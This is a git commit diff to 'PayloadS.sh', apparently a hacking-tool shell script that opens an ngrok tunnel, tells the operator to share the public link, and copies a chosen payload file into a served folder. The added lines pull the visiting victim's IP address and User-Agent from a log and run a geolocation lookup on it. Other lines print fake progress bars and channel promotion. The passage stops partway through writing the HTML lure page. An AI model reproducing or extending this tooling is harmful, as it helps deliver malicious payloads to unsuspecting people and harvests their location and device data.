117dd49fab9f291c67c6aceb725a093eeea16332
Tech EFX Tv <59799893+efxtv@users.noreply.github.com>
2020-09-17 22:47:32 +0530

    Update PayloadS.sh

--- 1/PayloadS.sh
+++ 1/PayloadS.sh
@@ -16,10 +16,10 @@ tput setaf 1; echo "                   ╱▔▔▔▔╲
          ░█─── ░█─ ░█░█░█ ░█▀▄─ ─▀▀▀▄▄
          ░█▄▄█ ▄█▄ ░█──▀█ ░█─░█ ░█▄▄▄█ " | lolcat 
 		echo "	Please subscribe EFX Tv		" |toilet -f term -F border --gay
-printf "\e[1;92m[\e[0m-+\e[1;92m] Checking for Ngrok Executable...\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] Checking for Ngrok Executable...\n"
 sleep 3
 if [[ -e ngrok ]]; then
-echo ""
+printf "\e[1;92m[\e[0m+\e[1;92m] Ngrok Found Please Update If Not Updated...\n"
 else
 command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
 command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
@@ -52,7 +52,7 @@ fi
 fi
 fi
 #end
-echo -en "[\e[0mOk\e[1;92m] Enter the port number you want to forward :"
+echo -en "[\e[0m+\e[1;92m] Enter the port number you want to forward :"
 read port
 killall -2 ngrok > /dev/null 2>&1
 pkill -f -2 ngrok > /dev/null 2>&1
@@ -67,7 +67,7 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
 ./ngrok http $port > /dev/null 2>&1 &
 sleep 10
 #Extra added ends
-echo -e "[\e[0mOk\e[1;92m] Please wait..."
+echo -e "[\e[0m+\e[1;92m] Please wait..."
 sleep 2
 
 clear
@@ -87,27 +87,47 @@ tput setaf 1; echo "                   ╱▔▔▔▔╲
          ░█─── ░█─ ░█░█░█ ░█▀▄─ ─▀▀▀▄▄
          ░█▄▄█ ▄█▄ ░█──▀█ ░█─░█ ░█▄▄▄█ " | lolcat 
 		echo "	Please subscribe EFX Tv		" |toilet -f term -F border --gay
-echo -e "[\e[0mOk\e[1;92m] The port you forwarded is here:👉 \e[0m\e[1;93m $port"
+echo -e "\e[1;31m[\e[0m\e[1;37mOk\e[0m\e[1;31m]\e[0m\e[1;92m The port you forwarded:👉 \e[0m\e[1;93m $port"
 echo " "
 #below lines can be sued for generating direct link.
 ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;31m[\e[0m\e[1;37mOk\e[0m\e[1;31m]\e[0m\e[1;92m Here is your Link :👉 \e[0m\e[1;93m %s \n" $ngrok_link
+printf "\e[1;31m[\e[0m\e[1;37mOk\e[0m\e[1;31m]\e[0m\e[1;92m SHARE THIS LINK :👉 \e[0m\e[1;93m %s \n" $ngrok_link
 #Part generating direct link ends here.
 echo " "
 #Extra added 2
 #ip
 catch_ip() {
 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+device=$(grep -a 'User-Agent:' ip.txt | cut -d " " -f2- | tr -d '\r'|tr \) ' '|tr /} ' ')
+iplookup=$(curl -s https://json.geoiplookup.io/103.57.84.18|tr , '\n'|tr \" ' '|tr }/ ' '|tr {/ ' '|tr a-z A-Z|tr -s ' '|grep -v "PREMIUM"|grep -v "SUCCESS"|grep "\S")
 IFS=$'\n'
 printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] DEVICE:\e[0m\e[1;77m %s\e[0m\n" $device
+#Progress bar
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Gathering more details\e[0m\e[1;77m %s\e[0m\n"
+tput setaf 2; echo -ne '01010                     (33%)\r'
+sleep 2
+echo -ne '0101010101010             (66%)\r'
+sleep 3
+echo -ne '01010101010101010101010   (100%)\r'
+echo -ne '\n' | lolcat
+tput setaf 1; echo -ne 'HERE                         (33%)\r'
+sleep 1
+echo -ne 'HERE WE GO NO                (66%)\r'
+sleep 1
+echo -ne 'HERE WE GO NOW :SUCCESSFUL  (100%)\r'
+echo -ne '\n' | lolcat
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] [============== Subscribe EFX TV ==================]\e[0m\e[1;77m %s\e[0m\n"
+#PROGRESSBAR ENDS
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] [SUCCESS]:\e[0m\e[1;77m %s\e[0m\n" $iplookup
 cat ip.txt >> ip_clicked.txt
 rm -rf ip.txt
 }
 #Payload link generater
-echo -en "[\e[0mOk\e[1;92m] Enter the payload path? : "
+echo -en "\e[1;31m[\e[0m\e[1;37mOk\e[0m\e[1;31m]\e[0m\e[1;92m Enter the payload path? : "
 read payloadp
 
-echo -en "[\e[0mOk\e[1;92m] Enter the payload name You want to share ?: "
+echo -en "\e[1;31m[\e[0m\e[1;37mOk\e[0m\e[1;31m]\e[0m\e[1;92m Enter the payload name You want to share ?: "
 read payloady
 cp $payloadp/$payloady output
 echo "<!DOCTYPE html>
